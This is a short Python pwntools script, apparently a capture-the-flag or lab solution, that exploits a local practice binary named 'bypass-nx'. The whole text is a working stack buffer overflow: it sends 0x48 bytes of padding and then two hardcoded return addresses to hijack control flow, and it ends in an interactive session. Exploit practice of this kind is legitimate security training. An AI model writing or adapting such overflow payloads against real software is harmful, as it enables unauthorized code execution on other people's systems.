from pwn import *

p = process('./bypass-nx')

p.recvuntil(b': ')
p.send(b'a' * 0x48 + p64(0x4012b8) + p64(0x40121b))

p.interactive()